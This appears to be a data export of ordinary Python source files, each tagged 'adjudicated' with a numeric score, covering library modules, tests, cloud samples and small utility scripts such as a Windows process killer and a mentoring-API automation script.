    # Change suggested by Dan Knierim, who found that this performed a
    # ""refresh"", allowing us to kill processes created since this was run
    # for the first time.
    try:
        win32pdhutil.GetPerformanceAttributes(""Process"", ""ID Process"", procname)
    except:
        pass

    pids = win32pdhutil.FindPerformanceAttributesByName(procname)

    # If _my_ pid in there, remove it!
    try:
        pids.remove(win32api.GetCurrentProcessId())
    except ValueError:
        pass

    if len(pids) == 0:
        result = ""Can't find %s"" % procname
    elif len(pids) > 1:
        result = ""Found too many %s's - pids=`%s`"" % (procname, pids)
    else:
        handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0, pids[0])
        win32api.TerminateProcess(handle, 0)
        win32api.CloseHandle(handle)
        result = """"

    return result


if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        for procname in sys.argv[1:]:
            result = killProcName(procname)
            if result:
                print(result)
                print(""Dumping all processes..."")
                win32pdhutil.ShowAllProcesses()
            else:
                print(""Killed %s"" % procname)
    else:
        print(""Usage: killProcName.py procname ..."")"
227	adjudicated	3	"# Copyright 2019 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START cloudrun_broken_service]
# [START run_broken_service]
import json
import os

from flask import Flask


app = Flask(__name__)


@app.route(""/"", methods=[""GET""])
def index():
    print(""hello: received request."")

    # [START cloudrun_broken_service_problem]
    # [START run_broken_service_problem]
    NAME = os.getenv(""NAME"")

    if not NAME:
        print(""Environment validation failed."")
        raise Exception(""Missing required service parameter."")
    # [END run_broken_service_problem]
    # [END cloudrun_broken_service_problem]

    return f""Hello {NAME}""


# [END run_broken_service]
# [END cloudrun_broken_service]


@app.route(""/improved"", methods=[""GET""])
def improved():
    print(""hello: received request."")

    # [START cloudrun_broken_service_upgrade]
    # [START run_broken_service_upgrade]
    NAME = os.getenv(""NAME"")

    if not NAME:
        NAME = ""World""
        error_message = {
            ""severity"": ""WARNING"",
            ""message"": f""NAME not set, default to {NAME}"",
        }
        print(json.dumps(error_message))
    # [END run_broken_service_upgrade]
    # [END cloudrun_broken_service_upgrade]

    return f""Hello {NAME}""


# [START cloudrun_broken_service]
# [START run_broken_service]
if __name__ == ""__main__"":
    PORT = int(os.getenv(""PORT"")) if os.getenv(""PORT"") else 8080

    # This is used when running locally. Gunicorn is used to run the
    # application on Cloud Run. See entrypoint in Dockerfile.
    app.run(host=""127.0.0.1"", port=PORT, debug=True)
# [END run_broken_service]
# [END cloudrun_broken_service]"
429	adjudicated	1	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response):
        if not apps.is_installed(""django.contrib.sites""):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == """":
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
478	adjudicated	2	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.arrays import BooleanArray
from pandas.tests.arrays.masked_shared import ComparisonOps


@pytest.fixture
def data():
    """"""Fixture returning boolean array with valid and missing data""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.fixture
def dtype():
    """"""Fixture returning BooleanDtype""""""
    return pd.BooleanDtype()


class TestComparisonOps(ComparisonOps):
    def test_compare_scalar(self, data, comparison_op):
        self._compare_other(data, comparison_op, True)

    def test_compare_array(self, data, comparison_op):
        other = pd.array([True] * len(data), dtype=""boolean"")
        self._compare_other(data, comparison_op, other)
        other = np.array([True] * len(data))
        self._compare_other(data, comparison_op, other)
        other = pd.Series([True] * len(data))
        self._compare_other(data, comparison_op, other)

    @pytest.mark.parametrize(""other"", [True, False, pd.NA])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_array(self, comparison_op):
        op = comparison_op
        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        b = pd.array([True, False, None] * 3, dtype=""boolean"")

        result = op(a, b)

        values = op(a._data, b._data)
        mask = a._mask | b._mask
        expected = BooleanArray(values, mask)
        tm.assert_extension_array_equal(result, expected)

        # ensure we haven't mutated anything inplace
        result[0] = None
        tm.assert_extension_array_equal(
            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        )
        tm.assert_extension_array_equal(
            b, pd.array([True, False, None] * 3, dtype=""boolean"")
        )"
468	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scatter3d"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
439	adjudicated	3	"from __future__ import unicode_literals

# For backwards-compatibility. keep this file.
# (Many people are going to have key bindings that rely on this file.)
from .app import *

__all__ = [
    # Old names.
    'HasArg',
    'HasCompletions',
    'HasFocus',
    'HasSelection',
    'HasValidationError',
    'IsDone',
    'IsReadOnly',
    'IsMultiline',
    'RendererHeightIsKnown',
    'InEditingMode',
    'InPasteMode',

    'ViMode',
    'ViNavigationMode',
    'ViInsertMode',
    'ViInsertMultipleMode',
    'ViReplaceMode',
    'ViSelectionMode',
    'ViWaitingForTextObjectMode',
    'ViDigraphMode',

    'EmacsMode',
    'EmacsInsertMode',
    'EmacsSelectionMode',

    'IsSearching',
    'HasSearch',
    'ControlIsSearchable',
]

# Keep the original classnames for backwards compatibility.
HasValidationError = lambda: has_validation_error
HasArg = lambda: has_arg
IsDone = lambda: is_done
RendererHeightIsKnown = lambda: renderer_height_is_known
ViNavigationMode = lambda: vi_navigation_mode
InPasteMode = lambda: in_paste_mode
EmacsMode = lambda: emacs_mode
EmacsInsertMode = lambda: emacs_insert_mode
ViMode = lambda: vi_mode
IsSearching = lambda: is_searching
HasSearch = lambda: is_searching
ControlIsSearchable = lambda: control_is_searchable
EmacsSelectionMode = lambda: emacs_selection_mode
ViDigraphMode = lambda: vi_digraph_mode
ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode
ViSelectionMode = lambda: vi_selection_mode
ViReplaceMode = lambda: vi_replace_mode
ViInsertMultipleMode = lambda: vi_insert_multiple_mode
ViInsertMode = lambda: vi_insert_mode
HasSelection = lambda: has_selection
HasCompletions = lambda: has_completions
IsReadOnly = lambda: is_read_only
IsMultiline = lambda: is_multiline

HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)
InEditingMode = in_editing_mode"
237	adjudicated	3	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley with assistance from asn1ate v.0.6.0.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# CMS Encrypted Key Package Content Type
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc6032.txt
#

from pyasn1.type import namedtype
from pyasn1.type import tag
from pyasn1.type import univ

from pyasn1_modules import rfc5652
from pyasn1_modules import rfc5083


# Content Decryption Key Identifier attribute

id_aa_KP_contentDecryptKeyID = univ.ObjectIdentifier('2.16.840.1.101.2.1.5.66')

class ContentDecryptKeyID(univ.OctetString):
    pass

aa_content_decrypt_key_identifier = rfc5652.Attribute()
aa_content_decrypt_key_identifier['attrType'] = id_aa_KP_contentDecryptKeyID
aa_content_decrypt_key_identifier['attrValues'][0] = ContentDecryptKeyID()


# Encrypted Key Package Content Type

id_ct_KP_encryptedKeyPkg = univ.ObjectIdentifier('2.16.840.1.101.2.1.2.78.2')

class EncryptedKeyPackage(univ.Choice):
    pass

EncryptedKeyPackage.componentType = namedtype.NamedTypes(
    namedtype.NamedType('encrypted', rfc5652.EncryptedData()),
    namedtype.NamedType('enveloped', rfc5652.EnvelopedData().subtype(
        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
    namedtype.NamedType('authEnveloped', rfc5083.AuthEnvelopedData().subtype(
        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))
)


# Map of Attribute Type OIDs to Attributes are
# added to the ones that are in rfc5652.py

_cmsAttributesMapUpdate = {
    id_aa_KP_contentDecryptKeyID: ContentDecryptKeyID(),
}

rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)


# Map of Content Type OIDs to Content Types are
# added to the ones that are in rfc5652.py

_cmsContentTypesMapUpdate = {
    id_ct_KP_encryptedKeyPkg: EncryptedKeyPackage(),
}

rfc5652.cmsContentTypesMap.update(_cmsContentTypesMapUpdate)"
377	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
266	adjudicated	1	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

from viktor._vendor.libcst._parser.grammar import _should_include
from viktor._vendor.libcst._parser.parso.utils import PythonVersionInfo
from viktor._vendor.libcst.testing.utils import data_provider, UnitTest


class VersionCompareTest(UnitTest):
    @data_provider(
        (
            # Simple equality
            (""==3.6"", PythonVersionInfo(3, 6), True),
            (""!=3.6"", PythonVersionInfo(3, 6), False),
            # Equal or GT/LT
            ("">=3.6"", PythonVersionInfo(3, 5), False),
            ("">=3.6"", PythonVersionInfo(3, 6), True),
            ("">=3.6"", PythonVersionInfo(3, 7), True),
            (""<=3.6"", PythonVersionInfo(3, 5), True),
            (""<=3.6"", PythonVersionInfo(3, 6), True),
            (""<=3.6"", PythonVersionInfo(3, 7), False),
            # GT/LT
            ("">3.6"", PythonVersionInfo(3, 5), False),
            ("">3.6"", PythonVersionInfo(3, 6), False),
            ("">3.6"", PythonVersionInfo(3, 7), True),
            (""<3.6"", PythonVersionInfo(3, 5), True),
            (""<3.6"", PythonVersionInfo(3, 6), False),
            (""<3.6"", PythonVersionInfo(3, 7), False),
            # Multiple checks
            ("">3.6,<3.8"", PythonVersionInfo(3, 6), False),
            ("">3.6,<3.8"", PythonVersionInfo(3, 7), True),
            ("">3.6,<3.8"", PythonVersionInfo(3, 8), False),
        )
    )
    def test_tokenize(
        self,
        requested_version: str,
        actual_version: PythonVersionInfo,
        expected_result: bool,
    ) -> None:
        self.assertEqual(
            _should_include(requested_version, actual_version), expected_result
        )"
326	adjudicated	2	"""""""
    pygments.lexers.pointless
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Pointless.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words
from pygments.token import Comment, Error, Keyword, Name, Number, Operator, \
    Punctuation, String, Text

__all__ = ['PointlessLexer']


class PointlessLexer(RegexLexer):
    """"""
    For Pointless source code.

    .. versionadded:: 2.7
    """"""

    name = 'Pointless'
    url = 'https://ptls.dev'
    aliases = ['pointless']
    filenames = ['*.ptls']

    ops = words([
        ""+"", ""-"", ""*"", ""/"", ""**"", ""%"", ""+="", ""-="", ""*="",
        ""/="", ""**="", ""%="", ""|>"", ""="", ""=="", ""!="", ""<"", "">"",
        ""<="", "">="", ""=>"", ""$"", ""++"",
    ])

    keywords = words([
        ""if"", ""then"", ""else"", ""where"", ""with"", ""cond"",
        ""case"", ""and"", ""or"", ""not"", ""in"", ""as"", ""for"",
        ""requires"", ""throw"", ""try"", ""catch"", ""when"",
        ""yield"", ""upval"",
    ], suffix=r'\b')

    tokens = {
        'root': [
            (r'[ \n\r]+', Text),
            (r'--.*$', Comment.Single),
            (r'""""""', String, 'multiString'),
            (r'""', String, 'string'),
            (r'[\[\](){}:;,.]', Punctuation),
            (ops, Operator),
            (keywords, Keyword),
            (r'\d+|\d*\.\d+', Number),
            (r'(true|false)\b', Name.Builtin),
            (r'[A-Z][a-zA-Z0-9]*\b', String.Symbol),
            (r'output\b', Name.Variable.Magic),
            (r'(export|import)\b', Keyword.Namespace),
            (r'[a-z][a-zA-Z0-9]*\b', Name.Variable)
        ],
        'multiString': [
            (r'\\.', String.Escape),
            (r'""""""', String, '#pop'),
            (r'""', String),
            (r'[^\\""]+', String),
        ],
        'string': [
            (r'\\.', String.Escape),
            (r'""', String, '#pop'),
            (r'\n', Error),
            (r'[^\\""]+', String),
        ],
    }"
104	adjudicated	0	"from environs import Env

from api import MentorsAPI


def main() -> None:
    env = Env()
    env.read_env()

    mentors_api = MentorsAPI(env.str('DVMN_USERNAME'), env.str('DVMN_PASSWORD'))
    mentor_uuid = env.str('MENTOR_UUID')

    orders = mentors_api.get_mentor_orders(mentor_uuid)

    for order in orders:
        if not order['is_active']:
            continue

        notes = order['student']['notes']
        proj_notes = [
            n for n in notes if 
            'ÐÐ° Ð¿ÑÐ¾ÐµÐºÑÐµ' in n['content']
            and not n['is_hidden']
        ]
        if not proj_notes:
            continue

        tasks = mentors_api.get_study_program_by_order_uuid(order['uuid'])
        project_task = None
        for task in tasks:
            if any([
                'ÐÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÐµ Ð¿ÑÐ¾ÐµÐºÑÑ' not in task['trainer']['title'],
                task['is_completed']
            ]):
                continue

            project_task = task
            break
        
        if not project_task:
            print(f'Ð£ÑÐµÐ½Ð¸ÐºÑ: {order[""uuid""]} Ð½Ðµ Ð²ÑÐ´Ð°Ð½ ÐºÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÐ¹ Ð¿ÑÐ¾ÐµÐºÑ.')
            continue
        
        try:
            plan_uuid = mentors_api.create_weekly_plan(
                order['uuid'],
                project_task['uuid'],
                project_task['execution_time']
            )
            mentors_api.create_gist(plan_uuid)
            mentors_api.give_weekly_plan(
                order['uuid'],
                project_task['uuid'],
                project_task['execution_time'],
                plan_uuid
            )
            mentors_api.update_gist(plan_uuid)
        except Exception as err:
            print(f'Ð§ÑÐ¾-ÑÐ¾ Ð¿Ð¾ÑÐ»Ð¾ Ð½Ðµ ÑÐ°Ðº Ð² Ð·Ð°ÐºÐ°Ð·Ðµ: {order[""uuid""]}')
        else:
            for n in proj_notes:
                mentors_api.close_note(n['uuid'])

            mentors_api.add_note(
                student_uuid=order['student']['profile']['uuid'],
                comment='$: ÐÐ°ÑÑÐ°Ð»Ð° Ð¿Ð¾ÑÐ° ÐºÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÑ Ð¿ÑÐ¾ÐµÐºÑÐ¾Ð²! ÐÐ°Ðº Ð½Ð°ÑÑÑÐ¾Ð¹?)'
            )



if __name__ == '__main__':
    main()"
295	adjudicated	3	"from typing import Any, Dict, Optional, Union
from warnings import warn

from .api import from_bytes
from .constant import CHARDET_CORRESPONDENCE


def detect(
    byte_str: bytes, should_rename_legacy: bool = False, **kwargs: Any
) -> Dict[str, Optional[Union[str, float]]]:
    """"""
    chardet legacy method
    Detect the encoding of the given byte string. It should be mostly backward-compatible.
    Encoding name will match Chardet own writing whenever possible. (Not on encoding name unsupported by it)
    This function is deprecated and should be used to migrate your project easily, consult the documentation for
    further information. Not planned for removal.

    :param byte_str:     The byte sequence to examine.
    :param should_rename_legacy:  Should we rename legacy encodings
                                  to their more modern equivalents?
    """"""
    if len(kwargs):
        warn(
            f""charset-normalizer disregard arguments '{','.join(list(kwargs.keys()))}' in legacy function detect()""
        )

    if not isinstance(byte_str, (bytearray, bytes)):
        raise TypeError(  # pragma: nocover
            ""Expected object of type bytes or bytearray, got: ""
            ""{0}"".format(type(byte_str))
        )

    if isinstance(byte_str, bytearray):
        byte_str = bytes(byte_str)

    r = from_bytes(byte_str).best()

    encoding = r.encoding if r is not None else None
    language = r.language if r is not None and r.language != ""Unknown"" else """"
    confidence = 1.0 - r.chaos if r is not None else None

    # Note: CharsetNormalizer does not return 'UTF-8-SIG' as the sig get stripped in the detection/normalization process
    # but chardet does return 'utf-8-sig' and it is a valid codec name.
    if r is not None and encoding == ""utf_8"" and r.bom:
        encoding += ""_sig""

    if should_rename_legacy is False and encoding in CHARDET_CORRESPONDENCE:
        encoding = CHARDET_CORRESPONDENCE[encoding]

    return {
        ""encoding"": encoding,
        ""language"": language,
        ""confidence"": confidence,
    }"
44	adjudicated	0	"# flake8: noqa
# errmsg.h
CR_ERROR_FIRST = 2000
CR_UNKNOWN_ERROR = 2000
CR_SOCKET_CREATE_ERROR = 2001
CR_CONNECTION_ERROR = 2002
CR_CONN_HOST_ERROR = 2003
CR_IPSOCK_ERROR = 2004
CR_UNKNOWN_HOST = 2005
CR_SERVER_GONE_ERROR = 2006
CR_VERSION_ERROR = 2007
CR_OUT_OF_MEMORY = 2008
CR_WRONG_HOST_INFO = 2009
CR_LOCALHOST_CONNECTION = 2010
CR_TCP_CONNECTION = 2011
CR_SERVER_HANDSHAKE_ERR = 2012
CR_SERVER_LOST = 2013
CR_COMMANDS_OUT_OF_SYNC = 2014
CR_NAMEDPIPE_CONNECTION = 2015
CR_NAMEDPIPEWAIT_ERROR = 2016
CR_NAMEDPIPEOPEN_ERROR = 2017
CR_NAMEDPIPESETSTATE_ERROR = 2018
CR_CANT_READ_CHARSET = 2019
CR_NET_PACKET_TOO_LARGE = 2020
CR_EMBEDDED_CONNECTION = 2021
CR_PROBE_SLAVE_STATUS = 2022
CR_PROBE_SLAVE_HOSTS = 2023
CR_PROBE_SLAVE_CONNECT = 2024
CR_PROBE_MASTER_CONNECT = 2025
CR_SSL_CONNECTION_ERROR = 2026
CR_MALFORMED_PACKET = 2027
CR_WRONG_LICENSE = 2028

CR_NULL_POINTER = 2029
CR_NO_PREPARE_STMT = 2030
CR_PARAMS_NOT_BOUND = 2031
CR_DATA_TRUNCATED = 2032
CR_NO_PARAMETERS_EXISTS = 2033
CR_INVALID_PARAMETER_NO = 2034
CR_INVALID_BUFFER_USE = 2035
CR_UNSUPPORTED_PARAM_TYPE = 2036

CR_SHARED_MEMORY_CONNECTION = 2037
CR_SHARED_MEMORY_CONNECT_REQUEST_ERROR = 2038
CR_SHARED_MEMORY_CONNECT_ANSWER_ERROR = 2039
CR_SHARED_MEMORY_CONNECT_FILE_MAP_ERROR = 2040
CR_SHARED_MEMORY_CONNECT_MAP_ERROR = 2041
CR_SHARED_MEMORY_FILE_MAP_ERROR = 2042
CR_SHARED_MEMORY_MAP_ERROR = 2043
CR_SHARED_MEMORY_EVENT_ERROR = 2044
CR_SHARED_MEMORY_CONNECT_ABANDONED_ERROR = 2045
CR_SHARED_MEMORY_CONNECT_SET_ERROR = 2046
CR_CONN_UNKNOW_PROTOCOL = 2047
CR_INVALID_CONN_HANDLE = 2048
CR_SECURE_AUTH = 2049
CR_FETCH_CANCELED = 2050
CR_NO_DATA = 2051
CR_NO_STMT_METADATA = 2052
CR_NO_RESULT_SET = 2053
CR_NOT_IMPLEMENTED = 2054
CR_SERVER_LOST_EXTENDED = 2055
CR_STMT_CLOSED = 2056
CR_NEW_STMT_METADATA = 2057
CR_ALREADY_CONNECTED = 2058
CR_AUTH_PLUGIN_CANNOT_LOAD = 2059
CR_DUPLICATE_CONNECTION_ATTR = 2060
CR_AUTH_PLUGIN_ERR = 2061
CR_ERROR_LAST = 2061"
155	adjudicated	2	"import json
import requests


class APIMng:
    def __init__(self, melexID):
        self.Melex_ID = melexID
        self.Requests_endpoint = {
            'url_recived': 'http://213.97.17.253:9000/requests/state/recived',
            'url_put': 'http://213.97.17.253:9000/request',
            'url_progress': 'http://213.97.17.253:9000/requests/state/progress',
            'json': None,
            'id': None
        }
        self.ParametersCCAA_endpoint = {
            'url': 'http://213.97.17.253:9000/parametersCA/',
            'json': None
        }
        self.estate = None

    def __del__(self):
        pass

    # Pedir tareas REQUESTS/GET
    def get_requests_api(self):
        r = requests.get(url=self.Requests_endpoint['url_recived'])
        self.Requests_endpoint['json'] = json.loads(r.text)
        return self.Requests_endpoint['json']

    def task_progress(self):
        r = requests.get(url=self.Requests_endpoint['url_progress'])
        print(r.text)
        if isinstance(json.loads(r.text), dict):
            return None, False
        else:
            return json.loads(r.text), True

    # Mandar actualizaciÃ³n tareas (progreso o acabada) REQUESTS/PUT
    def put_requests_api(self):
        print(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), self.Requests_endpoint['json'])
        r = requests.put(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), json=self.Requests_endpoint['json'])
        print(r)

    # Mandar parÃ¡metros del vehÃ­culo (PARAMETERScar/PUT)
    def put_ParametersCCAA_api(self):
        r = requests.put(self.ParametersCCAA_endpoint['url'] + self.Melex_ID, json=self.ParametersCCAA_endpoint['json'])

    # Crear JSON para hacer el put al endpoint Requests
    def requests_put_json(self, data, id):
        self.Requests_endpoint[""json""] = data
        self.Requests_endpoint[""id""] = id

    def create_ParametersCCAA_json(self, data):
        self.ParametersCCAA_endpoint[""json""] = data

"
15	adjudicated	3	"import sys


class VendorImporter:
    """"""
    A PEP 302 meta path importer for finding optionally-vendored
    or otherwise naturally-installed packages from root_name.
    """"""

    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):
        self.root_name = root_name
        self.vendored_names = set(vendored_names)
        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')

    @property
    def search_path(self):
        """"""
        Search first the vendor package then as a natural package.
        """"""
        yield self.vendor_pkg + '.'
        yield ''

    def find_module(self, fullname, path=None):
        """"""
        Return self when fullname starts with root_name and the
        target module is one vendored through this importer.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        if root:
            return
        if not any(map(target.startswith, self.vendored_names)):
            return
        return self

    def load_module(self, fullname):
        """"""
        Iterate over the search path to locate and load fullname.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        for prefix in self.search_path:
            try:
                extant = prefix + target
                __import__(extant)
                mod = sys.modules[extant]
                sys.modules[fullname] = mod
                return mod
            except ImportError:
                pass
        else:
            raise ImportError(
                ""The '{target}' package is required; ""
                ""normally this is bundled with this package so if you get ""
                ""this warning, consult the packager of your ""
                ""distribution."".format(**locals())
            )

    def install(self):
        """"""
        Install this importer into sys.meta_path if not already present.
        """"""
        if self not in sys.meta_path:
            sys.meta_path.append(self)


names = 'packaging', 'pyparsing', 'six', 'appdirs'
VendorImporter(__name__, names).install()"
384	adjudicated	0	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import display
from esphome.const import (
    CONF_BRIGHTNESS,
    CONF_EXTERNAL_VCC,
    CONF_LAMBDA,
    CONF_MODEL,
    CONF_RESET_PIN,
)

CODEOWNERS = [""@kbx81""]

ssd1325_base_ns = cg.esphome_ns.namespace(""ssd1325_base"")
SSD1325 = ssd1325_base_ns.class_(""SSD1325"", cg.PollingComponent, display.DisplayBuffer)
SSD1325Model = ssd1325_base_ns.enum(""SSD1325Model"")

MODELS = {
    ""SSD1325_128X32"": SSD1325Model.SSD1325_MODEL_128_32,
    ""SSD1325_128X64"": SSD1325Model.SSD1325_MODEL_128_64,
    ""SSD1325_96X16"": SSD1325Model.SSD1325_MODEL_96_16,
    ""SSD1325_64X48"": SSD1325Model.SSD1325_MODEL_64_48,
    ""SSD1327_128X128"": SSD1325Model.SSD1327_MODEL_128_128,
}

SSD1325_MODEL = cv.enum(MODELS, upper=True, space=""_"")

SSD1325_SCHEMA = display.FULL_DISPLAY_SCHEMA.extend(
    {
        cv.Required(CONF_MODEL): SSD1325_MODEL,
        cv.Optional(CONF_RESET_PIN): pins.gpio_output_pin_schema,
        cv.Optional(CONF_BRIGHTNESS, default=1.0): cv.percentage,
        cv.Optional(CONF_EXTERNAL_VCC): cv.boolean,
    }
).extend(cv.polling_component_schema(""1s""))


async def setup_ssd1325(var, config):
    await cg.register_component(var, config)
    await display.register_display(var, config)

    cg.add(var.set_model(config[CONF_MODEL]))
    if CONF_RESET_PIN in config:
        reset = await cg.gpio_pin_expression(config[CONF_RESET_PIN])
        cg.add(var.set_reset_pin(reset))
    if CONF_BRIGHTNESS in config:
        cg.add(var.init_brightness(config[CONF_BRIGHTNESS]))
    if CONF_EXTERNAL_VCC in config:
        cg.add(var.set_external_vcc(config[CONF_EXTERNAL_VCC]))
    if CONF_LAMBDA in config:
        lambda_ = await cg.process_lambda(
            config[CONF_LAMBDA], [(display.DisplayBufferRef, ""it"")], return_type=cg.void
        )
        cg.add(var.set_writer(lambda_))"
83	adjudicated	3	"#!/usr/bin/env python
# Copyright 2021 Google, Inc
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# All Rights Reserved.

# [START recaptcha_enterprise_get_site_key]
from google.cloud import recaptchaenterprise_v1


def get_site_key(project_id: str, recaptcha_site_key: str) -> None:
    """"""
    Get the reCAPTCHA site key present under the project ID.

    Args:
    project_id: GCloud Project ID.
    recaptcha_site_key: Specify the site key to get the details.
    """"""

    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()

    # Construct the key details.
    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""

    request = recaptchaenterprise_v1.GetKeyRequest()
    request.name = key_name

    key = client.get_key(request)
    print(""Successfully obtained the key !"" + key.name)


# [END recaptcha_enterprise_get_site_key]


if __name__ == ""__main__"":
    import google.auth
    import google.auth.exceptions

    # TODO(developer): Replace the below variables before running
    try:
        default_project_id = google.auth.default()[1]
        recaptcha_site_key = ""recaptcha_site_key""
    except google.auth.exceptions.DefaultCredentialsError:
        print(
            ""Please use `gcloud auth application-default login` ""
            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""
        )
    else:
        get_site_key(default_project_id, recaptcha_site_key)"
312	adjudicated	4	"#!../env.py
#
# SPDX-License-Identifier: BSD-3-Clause
# Copyright 2020, Intel Corporation

import testframework as t
from testframework import granularity as g
import futils
import os


# All test cases in pmem2_persist_valgrind use Valgrind, which is not available
# on Windows systems.
@t.windows_exclude
@t.require_valgrind_enabled('pmemcheck')
# XXX In the match file, there are two possible numbers of errors. It varies
# from compiler to compiler. There should be only one number when pmemcheck
# will be fixed. Please also remove the below requirement after pmemcheck fix.
# https://github.com/pmem/valgrind/pull/76
@g.require_granularity(g.CL_OR_LESS)
